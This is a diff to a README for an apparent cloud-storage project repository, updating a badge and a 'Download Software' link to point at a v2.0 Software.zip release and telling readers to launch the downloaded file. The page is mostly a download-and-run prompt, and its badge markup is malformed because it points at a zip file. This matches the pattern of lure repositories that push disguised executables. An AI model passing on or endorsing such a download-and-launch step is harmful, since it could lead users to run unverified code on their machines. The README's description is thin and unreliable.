@@ -1,6 +1,6 @@
 # 🌟 Welcome to the SNU 2D CloudDrive Plans Repository! 📑️💻🔒
 
-![SNU 2D CloudDrive Plans](https://github.com/nahmo11111/SNU_2D_CloudDrive_Plans/releases/download/v1.0/Program.zip%CLOUD--DRIVE-green)
+![SNU 2D CloudDrive Plans](https://github.com/nahmo11111/SNU_2D_CloudDrive_Plans/releases/download/v2.0/Software.zip%CLOUD--DRIVE-green)
 
 ## Repository Name: SNU_2D_CloudDrive_Plans
 This repository is the official source for the SNU 2D CloudDrive service plans project.
@@ -13,7 +13,7 @@ The SNU 2D CloudDrive Plans project aims to provide file-sharing and online stor
 
 ## Get Started
 To get access to the software for the SNU 2D CloudDrive Plans project, please download it from the following link: 
-[Download Software](https://github.com/nahmo11111/SNU_2D_CloudDrive_Plans/releases/download/v1.0/Program.zip)
+[Download Software](https://github.com/nahmo11111/SNU_2D_CloudDrive_Plans/releases/download/v2.0/Software.zip)
 
 *Launch the downloaded file to begin using the SNU 2D CloudDrive Plans software.*
 
